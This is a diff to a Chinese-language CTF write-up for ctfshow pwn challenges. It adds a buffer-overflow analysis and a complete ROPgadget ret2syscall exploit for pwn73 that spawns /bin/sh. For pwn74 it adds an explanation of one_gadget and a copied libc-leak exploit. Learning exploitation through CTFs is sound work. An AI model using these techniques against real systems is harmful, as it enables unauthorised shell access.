@@ -5056,15 +5056,189 @@ ctfshow{c1c089b0-9c87-4544-a399-21c68a39a476}
 
 
 
-## 73. pwn73
+## 73. pwn73（ROPgadget一把梭）
+
+愉快的尝试一下一把梭吧！
+
+check还是32位nx保护
 
 
 
+ida打开，关键函数还是这里
+
+```c
+int show()
+{
+  char v1[24]; // [esp+0h] [ebp-18h] BYREF
+
+  puts("Try to Show-hand!!");
+  return gets(v1);
+}
+```
 
 
-## 74. pwn74
+
+cyclic计算偏移量发现是：28
 
 
+
+提示是一把梭，那我们直接ROPgadget
+
+`ROPgadget --binary pwn --ropchain`
+
+```
+ROPgadget --binary pwn --ropchain
+```
+
+gets无限制，所以直接复制粘贴就可以了
+
+
+
+直接exp：
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+from struct import pack
+context(arch='i386',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28288
+elf = ELF('./pwn')
+
+r = remote(ip,port)
+
+offset = 28
+
+p = b'a'*offset
+
+p += pack('<I', 0x0806f02a) # pop edx ; ret
+p += pack('<I', 0x080ea060) # @ .data
+p += pack('<I', 0x080b81c6) # pop eax ; ret
+p += b'/bin'
+p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806f02a) # pop edx ; ret
+p += pack('<I', 0x080ea064) # @ .data + 4
+p += pack('<I', 0x080b81c6) # pop eax ; ret
+p += b'//sh'
+p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806f02a) # pop edx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x08049303) # xor eax, eax ; ret
+p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080481c9) # pop ebx ; ret
+p += pack('<I', 0x080ea060) # @ .data
+p += pack('<I', 0x080de955) # pop ecx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x0806f02a) # pop edx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x08049303) # xor eax, eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0807a86f) # inc eax ; ret
+p += pack('<I', 0x0806cc25) # int 0x80
+
+r.recvuntil(b'Try to Show-hand!!')
+r.sendline(p)
+r.interactive()
+```
+
+
+
+拿到flag：
+
+```
+ctfshow{0d4f0028-8d27-47b0-8097-0ed9234489ea}
+```
+
+
+
+## ==74. pwn74（one_gadget）（libc版本问题，未完成）==
+
+噢？好像到现在为止还没有了解到one_gadget?
+
+check一下64位，保护全开
+
+
+
+ida打开，关键代码：
+
+```c
+printf("What's this:%p ?\n", &printf);
+  __isoc99_scanf("%ld", v4);
+  v4[1] = v4[0];
+  ((void (*)(void))v4[0])();
+```
+
+
+
+看到最后一行，这个把v4[0]
+
+scanf输入一个v4，可以栈溢出，但是无法执行，下面又调用个函数指针，意思就是传进去一个地址到v4[0]，它可以转换成函数进行调用，题目提示one_gadget，那就尝试用这个工具找到libc库中的execve函数的地址。再利用之前打印的printf地址计算出基址。
+
+
+
+众所周知，one_gadget工具可以查找libc中存在execve("/bin/sh", NULL, NULL)的片段
+
+
+
+反正流程是这样的：
+
+ldd查看动态链接库
+
+```
+ldd pwn
+```
+
+然后复制库的路径
+
+```
+one_gadget /lib/x86_64-linux-gnu/libc.so.6
+```
+
+查询可用的execve片段即可
+
+本题因为libc版本问题，无法解决
+
+
+
+网上exp：
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+from struct import pack
+context(arch='i386',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28295
+elf = ELF('./pwn')
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+r = remote(ip,port)
+
+r.recvuntil(b"this:")
+
+printf_addr = int(r.recv(14),16)
+
+libc_base = printf_addr - libc.symbols["printf"]
+
+execve_addr = libc_base + 0x10a2fc
+
+payload = str(execve_addr)
+
+r.sendline(payload)
+r.interactive()
+```
 
 
 
@@ -5086,7 +5260,7 @@ ctfshow{c1c089b0-9c87-4544-a399-21c68a39a476}
 
 
 
-## 78. pwn78
+## ==78. pwn78（64位ret2syscall）==
 
 
 
